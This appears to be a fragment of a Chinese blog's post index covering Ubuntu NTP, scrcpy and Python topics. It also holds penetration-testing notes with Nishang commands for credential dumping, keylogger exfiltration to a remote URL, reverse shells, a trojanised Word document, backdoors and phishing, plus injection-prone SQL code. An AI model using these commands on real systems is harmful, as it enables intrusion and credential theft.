","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:6:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"NTP服务 （网络时间协议） 时间都去哪了 **时间表准： ** GMT：格林威治标准时间 UTC：世界协调时间 CST：China Standard Time UT+8:00 NTP协议 NTP客户端 客户端程序从时间服务器同步时间 系统启动时自动同步时间 网口激活时自动同步运行 手动同步时间 # 新版系统，查看客户端时间 timedatectl # RTC时间：硬件时间 新版系统使用timesyncd客户端同步时间 向这个域名请求：ntp.ubuntu.com timedatectrl list-timezones #列出所有时区 timedatectrl set-timezone #设置时区 timedatectrl set-time \"2019-10-01 18:18:18\" #设置系统时间 timedatectl set-ntp true #开始网络同步 systemctl status systemd-timesyncd.service # 查看时间服务状态 # 硬件时间(RTC)与UTC时间同步 sudo hwclock -w # 将系统时间写入到RTC时间 sudo hwlock -s # 将硬件 hwclock --set --date='2019-10-01 18:18:18' # 配置文件 /etc/systemd/timesyncd.conf 一个过时的东西(ntpdate) 新版本系统使用timesyncd替换ntpd的客户端功能 一旦安装了ntpdate / ntp, timedatectrl将被禁用 ntpd – 客户端+服务器 把机器设置成时间服务器 apt install ntp # 安装ntp服务 systemctl start ntp # 启动服务(123端口就被打开了) systemctl status ntp # 查询服务状态 systemctl restart ntp # 重启服务 ##配置文件（我也要跟上一级的时间服务器同步） vim /etc/ntp.conf #如果不使用官方的时间服务器，可以自己指定 server 1.1.1.1 #首选网络时间服务器不可用的时候，使用本机始终作为备用时间源 fudge 127.127.1.1 startum 10 # 层级设置低点( startum 10, 这里设置为10层) 配置文件中，主要的时间服务器如下 命令: ntpq – ntp服务端的查询命令 ntpq -p #命令执行结果详解如下图： 每行前面第一个字符含义： 空 表示无效主机 x 已不再使用 - 已不再使用 # 状态良好但为使用 + 良好且优先使用 * 首选主同步主机 （一般是startum层级最高的） 其他命令 #查看日期 date #设置 date --set 1998-11-11 #手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp） date --set 21:21:21 #设置时间 cat /etc/timezone #查看时区 ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:7:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"内网分类： 带域环境的内网 不带域环境的内网 一些端口 ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:0","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务 FTP服务： ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等； **默认端口：**20（数据端口）；21（控制端口）；69（tftp小型文件传输协议） 攻击方式： 爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块； 匿名访问：用户名：anonymous 密码：为空或任意邮箱 Samba服务 **Samba服务：**对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。 默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务） 攻击方式： 爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb 未授权访问：给予public用户高权限 远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等 LDAP协议 **ldap：**轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。 默认端口：389 攻击方式： 注入攻击盲注 未授权访问 爆破：弱口令 ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:1","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"远程连接服务端口渗透 SSH服务 SSH服务： 这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。 默认端口： 22 攻击方式： 爆破： 弱口令 漏洞：28退格漏洞、OpenSSL漏洞 Telent服务 **Telnet服务：**在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备； 默认端口： 23 攻击方式： 爆破：弱口令 嗅探：此种情况一般发生在局域网 远程桌面连接 **远程桌面连接：**作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等； 默认端口： 3389 攻击方式： 爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块) Shift粘滞键后门：5次shift后门 3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_…，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids） VNC服务 VNC服务: 一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也 **默认端口：**5900+桌面ID（5901；5902） 攻击方式： 爆破：弱口令 认证口令绕过： 拒绝服务攻击：（CVE-2015-5239） 权限提升：（CVE-2013-6886） 第三方软件 … … ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:2","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"Web应用服务端口渗透 1.中间件平台渗透 IIS Apache Nginx Weblogic tomcat Jboos Websphere等 # 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF` 2.WEB应用程序渗透 已知CMS 未知CMS 常规漏洞测试 ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:3","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"数据库服务端口渗透 针对所有的 数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。 MySQL数据库 默认端口： 3306 攻击方式： 爆破：弱口令 身份认证漏洞：CVE-2012-2122 拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器 Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意 MSSQL数据库 **默认端口：**1433（Server 数据库服务）、1434（Monitor 数据库监控） 攻击方式： 爆破：弱口令 Oracle数据库 **默认端口：**1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务） 攻击方式： 爆破：弱口令 漏洞攻击 PostgreSQL数据库 PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。 默认端口： 5432 攻击方式： 爆破弱口令：postgres postgres 缓冲区溢出：CVE-2014-2669 MongoDB数据库 MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考 默认端口： 27017 攻击方式： 爆破弱口令 未授权访问 Redis数据库 redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 Exp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547 默认端口： 6379 攻击方式： 爆破弱口令 未授权访问+配合ssh key提权 SysBase数据库 **默认端口：**服务端口5000；监听端口4100；备份端口：4200 攻击方式： 爆破： 弱口令; 命令注入 DB2数据库 **默认端口：**5000 攻击方式： 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922） **总结一下：**对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！ ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:4","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"邮件服务端口渗透 SMTP协议 smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！ 默认端口： 25（smtp）、465（smtps） 攻击方式： 爆破：弱口令 未授权访问 POP3协议 默认端口： 109（POP2）、110（POP3）、995（POP3S） 攻击方式： 爆破弱口令 未授权访问 IMAP协议 **默认端口：**143（imap）、993（imaps） 攻击方式： 爆破：弱口令 配置不当 ","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:5","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["渗透测试"],"content":"网络常见协议端口渗透 DNS服务 默认端口： 53 攻击方式： 区域传输漏洞 DHCP服务 **默认端口：**67\u002668、546（DHCP Failover做双机热备的） 攻击方式： DHCP劫持 SNMP协议 默认端口： 161 攻击方式: 爆破弱口令 Powershell框架 推荐使用 NiShang 参考文章：https://www.4hou.com/posts/E99ml 下载地址: https://github.com/samratashok/nishang 各种命令解析： https://www.explainshell.com 安装问题 nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级） powershell ISE是一个编译器 powershell有很多渗透框架： PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异 实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要 目录结构： 模块和功能介绍： 演示： 端口扫描 密码获取 键盘记录 反弹会话 口令爆破 实战应用： 后续控制 域渗透 系统提权 # 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`） Import-Module .nishang.psml # 载入模块 查看NiShang都有哪些模块 Get-Command -Moudle nishang ## 查看机器基本信息 Get-Information # 把结果导出文件 Out-File Get-Information | Out-File res.txt # 检测是否为虚拟机 Check-VM ## 获取密码 Invoke-Minikatz #Dump出本机的凭证信息 Invoke-Minikatz -DumpCerts #dump出远程的两台计算机的凭证信息 Invoke-Minikatz -ComputerName @(\"computer1\", \"computer2\") #在远程的一台机器上运行Mimikatz 并执行 \"privilege::debug exit\" Invoke-Minikatz -Command \"privilege::debug exit\" -ComputerName@(\"computer1\") # Get-PassHashes 获取密码 # 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump） Get-PassHashes # 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率 Get-PassHints ## 获取帮助参数 Get-Help Get-Help Invoke-PortScan ## 端口扫描 查看帮助信息 Get-Help Invoke-PortScan -full Invoke-PortScan Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost # cd 切换到对应目录 ## 测试键盘记录: Get-Help .\\Keylogger.ps1 --full # 查看帮助（提供了四种方式记录） #-URL 要把记录发Keylogger送到的置顶的远程服务器 , -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录 .\\gather\\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php # 解释： 将记录指定发送给一个可以记录Post请求的Web服务器 # 默认保存到(内容是ascii码)： Windows/Temp/key.log # 把ascii记录解析为非ascii： Parse_Keys .\\key.log .\\parsed.txt # 持久化记录（重启之后也记录） .\\Keylogger.ps1 -persist ## 爆破口令 在scan目录下面 #用于对SQL Server、域控制器、Web和FTP弱口令爆破 Invoke-BruteForce #命令参数如下 -ComputerName # 对应服务的计算机名 -UserList 用户名字典 -PasswordList 密码字典 -Service 服务（默认为：SQL） -StopOnSuccess 匹配一个后停止 -Delay 延迟时间 #比如 Invoke-BruteForce -ComputerName xx-PC -UserList user.txt -PasswordList pass.txt -Service ActiveDirectory -Verbose # 内网扫描器 # 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener #1.在本机开启监听 FireListener 130-150 #2.在目标机器输入命令： FireListener 192.168.0.107 130-150 -Verbose ## 内网嗅探 动静很大，实在没有办法的时候可以试试 目标机执行以下命令 Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999 本机监听 nc -lvvp 9999 ## 屏幕窃取 Show-TargetScreen #本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可） Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443 # 将远程的画面传输给 192.168.230.1 的443端口 参数： Bind --\u003e 正向连接 在目标机执行以下命令（反向连接） Show-TargetScreen -IPAddress 192.168.230.172 -Port 3333 本机输入以下命令 ，接着访问本机的9999端口 nc -nlvp 3333 | nc -nlvp 9999 正向连接 目标机执行： Show-TargetScreen -Bind -Port 3333 本机执行： nc -nv 192.168.230.37 3333 | nc -lnvp 9999 ## Client 的生成(类似木马) 需要自己绑定payload 首先在本机监听： nc -lvp 4444 接着制作word文件，打开\\nishang\\Shell\\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行 Invoke-Encode -DataToEncode '复制的代码' -IsString -PostScript 执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt 接着执行命令 Out-Word-PayloadScript .\\encodedcommand.txt 会生成一个word文档，用户打开就中招，我们获取到反弹的powershell ## 后门 1.Http-Backdoor 可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本 2.Add-ScrnSaveBackdoor 利用windows的屏保来留下一个隐藏的后门 3.Execute-OnTime 与Http-Backdoor相比，多了定时功能 4.Invoke-ADSBackdoor 使用NTFS数据流留下的一个永久后门 最恐怖的后门 ## 钓鱼攻击(有道用户输入自己机器的密码) Invoke-CredentialsPhish ## webshell后门 位于 \\nishang\\Antak-WebShell目录下 就是一个asp的大马（使用的是powershell的命令，比cmd命令强大） # 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来） Copy-VSS # 直接把文件保存在当前路径下 Copy-VSS -DEstinationDir C:temp # 制定文件保存路径（必须是已存在的路径） ## 其他...... 后续控制 # windows上没有nc，需要提前上传一个nc.exe，推荐Linux ## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip） 在Shells目录下面 #1.攻击机器上 NC下执行","date":"2020-03-05","objectID":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/:0:6","tags":["内网","渗透"],"title":"内网渗透","uri":"/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"categories":["工具"],"content":"scrcpy 安装 snap install scrcpy adb服务安装 sudo apt-get install android-tools-adb adb配置 手机通过USB连接电脑 lsusb 找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个) 创建设备文件 下面所有的04e8改成自己的识别号, android.rules文件名可自定义 mkdir ~/.android # 注意你的设备号 echo 0x04e8 \u003e ~/.android/adb_usb.ini sudo touch /etc/udev/rules.d/android.rules sudo gedit /etc/udev/rules.d/android.rules 在文件中输入: 注意自己的设备号 SUBSYSTEM==\"usb\", SYSFS{idVendor}==\"你的设备号\", MODE=\"0666\" 保存后修改文件权限 sudo chmod 777 /etc/udev/rules.d/android.rules 启动adb服务 service udev restart adb start-server adb devices 有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开 使用scrcpy 命令行输入 # 直接使用 scrcpy # 设置显示尺寸为1080 nohun scrcpy -m 1080 \u0026 就会弹出界面了 scrcpy使用方法 \"\"\" 鼠标左键点击、滑动; 长按鼠标中键回到主屏幕;Ctrl+Shift+V 鼠标右键返回复制文本电脑到手机: 电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴 \"\"\" 快捷键 全屏/回到合适尺寸 ctrl +f ctrl + x 展开/折叠通知栏 ctrl +n ctrl + shift + n 结束投屏 scrcpy -S 或者关掉显示窗口即可 Scrcpy 的命令参数 关闭手机屏幕 scrcpy -S 限制画面分辨率 scrcpy -m 1024 (比如限制为 1024) 修改视频码率 scrcpy -b 4M (默认 8Mbps，改成 4Mbps) 裁剪画面 scrcpy -c 1224:1440:0:0 表示分辨率 1224x1440 并且偏移坐标为 (0,0) 多设备切换 scrcpy -s 设备ID (使用 adb devices 命令查看设备ID) 窗口置顶 scrcpy -T 显示触摸点击 scrcpy -t 在演示或录制教程时，可在画面上对应显示出点击动作 全屏显示 scrcpy -f 文件传输默认路径 scrcpy --push-target /你的/目录 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录 只读模式(仅显示不控制) scrcpy -n 屏幕录像 scrcpy -r 视频文件名.mp4 或 .mkv 屏幕录像 (禁用电脑显示) scrcpy -Nr 文件名.mkv 设置窗口标题 scrcpy --window-title '异次元好棒！' 同步传输声音 可借助 USBaudio 这个开源项目实现，但仅支持 Linux 系统 Scrcpy 快捷键列表 切换全屏模式 Ctrl+F 将窗口调整为1：1（完美像素） Ctrl+G 调整窗口大小以删除黑色边框 Ctrl+X | 双击黑色背景 设备 HOME 键 Ctrl+H | 鼠标中键 设备 BACK 键 Ctrl+B | 鼠标右键 设备 任务管理 键 (切换APP) Ctrl+S 设备 菜单 键 Ctrl+M 设备音量+键 Ctrl+↑ 设备音量-键 Ctrl+↓ 设备电源键 Ctrl+P 点亮手机屏幕 鼠标右键 复制内容到设备 Ctrl+V 启用/禁用 FPS 计数器（stdout） Ctrl+i 安装APK 将 apk 文件拖入投屏 传输文件到设备 将文件拖入投屏（非apk） 投屏并录屏：scrcpy -r file.mp4 不投屏只录屏：scrcpy -Nr file.mp4 录制声音 结合：https://github.com/rom1v/usbaudio ","date":"2020-02-24","objectID":"/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/:0:0","tags":["工具","scrcpy"],"title":"scrcpy-手机与电脑投屏神器","uri":"/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/"},{"categories":["Python"],"content":"并发： 任务数大于cpu个数 并行： cpu个数和任务数相同 GIL 锁: 任何python进程中，一次永远只有一个线程运行 一个python进程 只能执行一个线程 创建进程 ## 不同操作系统创建进程的区别： #linux上: fork() import os import time pid = os.fork() # 这个地方会创建一个子进程， 他的pid号值永远为0 if pid == 0: print(\"我是子进程\") time.sleep(3) else: print(\"我是父进程\") time.sleep(3) # win上创建进程 类似于导入机制 都通用的 import multiprocessing def func(): print(\"000\") if __name__ == '__main__': p = multiprocessing.Process(target=func) # 生成进程, 传参target= ，args= p.start() # 开启进程， 相当于一个子进程 进程标识 # 进程标识 pid import time import os import multiprocessing def func(): time.sleep(5) if __name__ == \"__main__\": print(\"main pid \", os.getpid()) # 当前进程的 print(multiprocessing.current_process().pid) p = multiprocessing.Process(target=func) print(p.pid) p.start() # start之后才有pid号 print(p.pid) time.sleep(10) # 线程的标识是 ident # 操作系统调用的是进程 \"\"\" 注意！ 操作系统并不能看到线程的标识。 因为，线程是由Python解释器 来负责调度的。 操作系统仅需要调度进程就行了 \"\"\" 守护进程 # 守护进程 daemon = True 主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程） import time import multiprocessing def func(): time.sleep(20) print(\"子进程结束\") if __name__ == \"__main__\": p = multiprocessing.Process(target=func, daemon = True) p.daemon = True # 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束 p.start() time.sleep(3) 终止进程 # 终止进程 import multiprocessing import time def func(): time.sleep(5) print(multiprocessing.current_process()) if __name__ == \"__main__\": p = multiprocessing.Process(target=func) p.start() time.sleep(2) # 主进程2s p.terminate() # 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个） 面向对象 # 面向对象 类继承创建进程 # start() --\u003e run(已经是在新的进程了) --\u003e target # target是由默认的run运行 import multiprocessing import time class My_Process(multiprocessing.Process): def __init__(self, *args, **kwargs): super().__init__(args, kwargs) print(\"初始化...\") def run(self): \"\"\" start 默认调用的方法 重写啦在这里 :return: \"\"\" print(\"run...\") self.task() time.sleep(5) def task(self): print(\"task...\") if __name__ == \"__main__\": p = My_Process() p.start() # start 方法会调用run # 创建进程的方式 ： multiprocessing.Process 类继承，重写run linux下：fork # 如果换成是线程的话：换掉继承类就行 进程通信 # -*- coding:utf-8 -*- import multiprocessing from multiprocessing import Manager # 管理器 def func(l): l.append(111) if __name__ == '__main__': manager = Manager() # 实例化 先开启一个公共进程，并返回一个管理器 l = manager.list() # 开启空间，左边就是代理 # l = manager.dict() \"\"\" 一般常用的空间类型是： 1. mgr.list() 2. mgr.dict() 3. mgr.Queue() \"\"\" print(l) p = multiprocessing.Process(target=func, args=(l,)) p.start() p.join() print(l) # 这样使用manager之后 l就是【共享】的了 进程池 \u0026 线程池 ps:有点乱 # from multiprocessing import Pool # 进程池 from multiprocessing.dummy import Pool #线程池 from multiprocessing.pool import ThreadPool # 线程池 import threading import time def func(i): print(\"{}-------555\".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print(\"处理数据完成\",args, kwargs) pool = Pool(6) # 不写的话 默认是cpu的个数 # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法 # pool.apply(func=func, ) ## 添加任务 阻塞 # pool.map(func, [i for i in range(5)]) #添加任务 不阻塞 pool.close() #关闭线程池 不在提交新的任务 pool.join() #等待进程池中的任务执行完毕 print(\"任务结束\") ########### 线程池的步骤 p = ThreadPool(3) # 实例化 p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞 p.close() p.join() # join()语句要放在close()语句后面 # 进程池比线程池耗费资源 # 可以将返回值.get() 但是get也会i阻塞 async_result = p.apply_async(func) # 函数 print(async_result.get()) 使用进程池来实现并发服务器 # 使用池来实现并发服务器 # 先开一个进程池， 每个进程下面再开一个线程 import socket from multiprocessing import Pool, cpu_count from multiprocessing.pool import ThreadPool def woeker_thread(conn): # 使用线程池来 while True: recv_data =conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break def worker_process(server): # 使用进程池来接收套接字 # pool = Pool(cpu_count()*2) # 通常可以分配2倍的cpu个数 pool = ThreadPool(cpu_count()) # 获取电脑核心数 while True: conn, addr = server.accept() pool.apply_async(woeker_thread, args=(conn,)) if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) n = cpu_count() # 获得当前计算机的cpu核心数量 pool = Pool(n) for i in range(n): # 充分利用cpu，为每个cpu分配一个进程 # conn, addr = server.accept() pool.appl","date":"2020-02-24","objectID":"/python-%E8%BF%9B%E7%A8%8B/:0:0","tags":["Python","进程"],"title":"python-进程","uri":"/python-%E8%BF%9B%E7%A8%8B/"},{"categories":["Python"],"content":"Python DBA API 包含的内容 访问数据库流程 与MySQL import pymysql db_config = { 'host': '127.0.0.1', 'user': 'hhh', 'password': '123', 'db': 'test', 'charset': 'utf8' } # 插入 try: conn = pymysql.connect(**db_config) cursor = conn.cursor() # 插入 id = '2018002' name = 'admin' age = 18 # insert into student values(id,name,age) sql = 'insert into student(id, name, age) values(%s,%s,%s)' cursor.execute(sql, (id, name, age)) # 删除 # table = 'students' # condittion = 'age \u003e 20' # sql = 'delete from {table} where {condittion}'.format(table=table, condittion=condittion) # 查询 sql = \"SELECT password FROM admin WHERE name='%s'\" % (name) cursor.execute(sql) pws = cursor.fetchall() except: print('error') conn.rollback() finally: conn.commit() # 数据有变动一定记得提交/双保险 cursor.close() conn.close() cursor对象支持的方法 与MongoDB from pymongo import * #建立连接 client = MongoClient('127.0.0.1',27017) #指定数据库 db = client.test #指定集合 collection = db.col # print(type(collection),collection) # python连接mongodb就搞定 mydict ={ '_id': 6, 'name': 'admin', 'age': 18, 'addr': 'didu' } # collection.insert(mydict) # print(collection.find()) # for i in collection.find(): # print(i) # for i in collection.find({'name':'zhanglinlin'}): # print(i) collection.update({'name':'zhanglinlin'},{'$set':{'age':22}},{'mult':'true'}) # collection.remove() 与redis import redis # # 连接,给定参数ip/port， redis默认端口6379 r = redis.Redis(host='127.0.0.1', port='6379') # # print(type(r),r) # # # 设置键值对 r.set('name', 'admin') # # 获取该键的值 str = r.get('name') print(str.decode('utf-8')) # 解码 ## 自动解码 参数：decode_responses=True r = redis.Redis(host='127.0.0.1',port='6379',decode_responses=True) r.set('name','哈哈') str = r.get('name') print(str) ## StrictRedis r = redis.StrictRedis(host='127.0.0.1',port='6379') r.set('name','哈哈') str = r.get('name') print(str,str.decode('utf-8')) ## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2 # k_v = { 'a1':'a', 'a2':'b', 'a3':'c' } r = redis.StrictRedis(host='127.0.0.1',port='6379') # 批量设置值 r.mset(**k_v) # 批量取值 print(r.mget('a1','a2','a3')) # r = redis.StrictRedis(host='127.0.0.1',port='6379') # 往列表添加值从头部开始 r.lpush('list1','haha') r.lpush('list1',3,4,5) # 获取列表值 print(r.lrange('list1',0,-1)) # r = redis.StrictRedis(host='127.0.0.1',port='6379') r.sadd('set1','aa') r.sadd('set2','aa',8,10,'bb') print(r.smembers('set2')) 与memcached import memcache # 建立连接 mc = memcache.Client(['127.0.0.1:11211'], debug=True) # 设置一个 mc.set('name', 'xps',time=60) # 设置多个 mc.set_multi({\"username\":\"handsome\", \"gender\":\"man\"}, time=60) # 获取一个 mc.get('age') # 获取多个 # 不管是元组还是列表都行，只要可迭代就行 res1 = mc.get_multi((\"username\", \"gender\")) res2 = mc.get_multi([\"username\", \"gender\"]) print(res1) print(res2) # 删除一个 mc.delete(\"key\") # 删除多个 mc.delete_multi([\"key1\", \"key2\"]) \"\"\" # 0表示永不过期 断电就会完蛋 适合做验证码 # prepend 前插 # append 后插 # telnet ip port 远程连接 \"\"\" 这里仅仅做了简单的介绍，具体还需要自己练习中学习 ","date":"2020-02-24","objectID":"/python-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/:1:0","tags":["Python"],"title":"python-数据库编程","uri":"/python-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/"},{"categories":["Python"],"content":"讲解 进程 是程序的一次执行。 每个进程都有自己的地址空间、内存、数据栈以及其他记录运行轨迹的辅助数据 线程 所有的线程运行在同一个进程当中，共享相同的运行环境。 线程有：开始、顺序执行、结束 三个部分。 多个线程协同完成一个进程的任务。 我们在编写安全工具的时候，使用多线程要更多些(使用多进程相对较少) ","date":"2020-02-24","objectID":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:0","tags":["Python","多线程"],"title":"python-多线程","uri":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Python"],"content":"thread 缺点：程序复杂时，不能计算线程数量和控制，稳定性不太好 使用_thread.start_new_thread(ping_check, (ip,)) ，第一个参数是回调函数，第二个的可变参数(tuple类型的) Note： 必须配合time.sleep() 实例: \"\"\" 使用ping检查C段机器(一个C段是0-255) \"\"\" import _thread import time import re from subprocess import Popen,PIPE def ping_check(ip_addr): # 一个执行系统命令的模块 check = Popen(['/bin/bash', '-c', 'ping -c 2 '+ip_addr], stdin=PIPE,stdout=PIPE) data = check.stdout.read() # 返回的数据 if 'ttl' in str(data): print(\"{} is up\".format(ip_addr)) def main(ip_three): for i in range(255): ip = ip_three + '.' + str(i) _thread.start_new_thread(ping_check, (ip,)) time.sleep(0.1) if __name__ == '__main__': ip_three = input(\"输入ip地址的前三个字节(不需要最后一个点): \\n\") # 判断最后是否有点 pattern = r'\\.$' has_point = re.findall(pattern, ip_three) if has_point: ip_three = ip_three[:-1] print(ip_three) main(ip_three) 